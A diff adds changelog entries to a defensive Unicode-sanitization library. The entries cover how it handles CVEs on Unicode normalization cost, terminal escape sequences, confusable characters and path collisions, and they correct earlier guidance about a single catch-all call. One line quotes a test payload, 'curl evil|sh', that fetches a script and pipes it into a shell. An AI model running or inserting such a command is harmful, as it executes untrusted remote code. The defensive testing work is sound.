@@ -18,6 +18,91 @@ compatibility (see [RELEASING.md](RELEASING.md)).
 
 ### Added
 
+- **Normalization cost as a CVE class, and a fourth disposition to describe it (33 → 36).**
+  CVE-2026-3276 (CPython `unicodedata.normalize()` on alternating-CCC runs, CWE-407),
+  CVE-2023-46695 (Django NFKC on Windows, re-reported three times since) and
+  CVE-2017-20190 ("Zalgo text", disputed, deferred, and carrying **no CVSS score at all** —
+  only SSVC).
+
+  The input here is not a disguise, it is a bill, and the existing vocabulary could not say
+  what disarm's relationship to it is. `not-affected` now means *the CVE is a defect in
+  another implementation of something disarm also does, and disarm's implementation was
+  measured and does not have it* — distinct from `out-of-scope`, which means disarm does
+  not stop the attack. It is a stronger claim, so it is gated: identical output to CPython
+  across all four forms, and a linear-cost bound.
+
+  **disarm is not uniformly faster, and the page says so.** Over nine input shapes at
+  20,000 characters it runs between 6× faster (CJK compatibility ideographs) and 10×
+  *slower* (already-normalized text, where CPython's quick-check short-circuits and disarm
+  does more work). An earlier informal measurement suggested a ~700× margin; that was a
+  cold-start artefact and does not survive best-of-N timing.
+
+  **The bound is the actual defense.** `canonicalize` collapses a 2,000-mark pile to at
+  most four characters, and `is_zalgo` flags the CVE-2026-3276 payload too — rejecting the
+  input costs less than normalizing it quickly. What disarm does **not** do is bound input
+  length, which is what the Frigate/Yeti/spbu_se_site CVEs in this family are actually
+  about; `test_disarm_does_not_bound_input_length` pins that distinction so the cap is not
+  misread as a resource limit.
+
+- **Eleven more CVEs, in the classes the matrix was thinnest on (22 → 33).**
+
+  | Class | Added |
+  |---|---|
+  | Ordering: normalize-then-validate | CVE-2026-28289, CVE-2024-43093, CVE-2023-41889, CVE-2023-52081 |
+  | Terminal control sequences | CVE-2025-55754, CVE-2024-52005, CVE-2023-43620, CVE-2023-37275 |
+  | Address bar and deny lists | CVE-2019-11721, CVE-2023-4399 |
+  | Case-folding path collision | CVE-2026-23950 |
+
+  **The ordering rows are out of scope on purpose.** disarm can produce the canonical
+  form; it cannot make a caller look at it first. CVE-2026-28289 states the bug in the
+  Threat Model's own terms — NVD describes a TOCTOU weakness where "the dot-prefix check
+  occurs before sanitization removes invisible characters". CVE-2024-43093 is in CISA's
+  Known Exploited Vulnerabilities catalog.
+
+  **The terminal class is neutralized and entirely undetected.** All six escape-sequence
+  rows are cleaned by `strip_log_injection` and reported by nothing, which is the sharpest
+  argument yet for cleaning unconditionally rather than screening first.
+  `test_no_detector_reports_any_terminal_control_row` pins that as a class-level claim.
+
+  **CVE-2026-23950 closes a loop.** node-tar's symlink poisoning turns on the `ß`/`ss`
+  path collision — the single code point the CVE-2019-19844 exhaustive scan identified as
+  the one the confusable table deliberately leaves alone, because `ß` is a real German
+  letter. The key builders collide it; the canonicalizers correctly do not.
+
+  Two schema changes fell out of the additions. `cvss` and `cvss_version` are now optional,
+  because CVE-2017-20190 has no CVSS record at all — only SSVC — and inventing a number
+  would be worse than an empty cell. `v4.0` joins the accepted versions.
+
+  One probe needed adjusting rather than one assertion: ASCII `|` is itself a TR39
+  confusable source, so a `curl evil|sh` payload tripped `is_confusable` for reasons
+  unrelated to its CVE. The derived-detector gate caught it as a false positive.
+
+- **Corrected: there is no single call that neutralizes every vector (#609 follow-up).**
+  The CVE page said `canonicalize` was the one call to make when the attack is unknown.
+  That was wrong, and its gate could not catch it, because every vector in the matrix at
+  the time happened to be one `canonicalize` handles.
+
+  **CVE-2017-7833** (Firefox, 5.3) is the vector that breaks it: a single Arabic vowel mark
+  riding a Latin letter. One mark sits below the zalgo threshold, so `is_zalgo` correctly
+  returns `False`, and `canonicalize` *caps* combining marks rather than removing them
+  (#429) — so the spoof never collapses onto the genuine host.
+
+  **CVE-2017-5383** (Firefox, 5.3) is the mirror image, and rules out the obvious
+  replacement. `strip_obfuscation` removes the mark, but renders punctuation confusables as
+  their *names* — `U+2010 HYPHEN` becomes the word "hyphen" — so it never folds to ASCII
+  `-`. Neither preset dominates the other and they fail on different inputs, so "5/6 each,
+  pick either" is the wrong read.
+
+  Measured across the matrix plus both, **no entry point clears everything**. `catalog_key`
+  comes closest — the only one carrying both a confusable step and `strip_accents` — and it
+  has no format-stripping step, so the Tags block of CVE-2025-32711 goes straight through.
+  The answer is a composition: `canonicalize(strip_zalgo(text, max_marks=0))`.
+
+  `TestOneCall` now gates both halves, including a test that **fails if any single entry
+  point ever does become sufficient**, so the guidance is revisited rather than left stale.
+  `has_bidi_conflict` also stops reading zero: CVE-2017-7833's Arabic mark beside Latin
+  letters is exactly the strong-direction mix it asks about.
+
 - **CVE matrix: comparator columns, split entry-point roles, and a measured "one call"
   answer (#607 follow-up).** Three gaps in the published matrix, all of them the kind that
   make a table look more useful than it is.
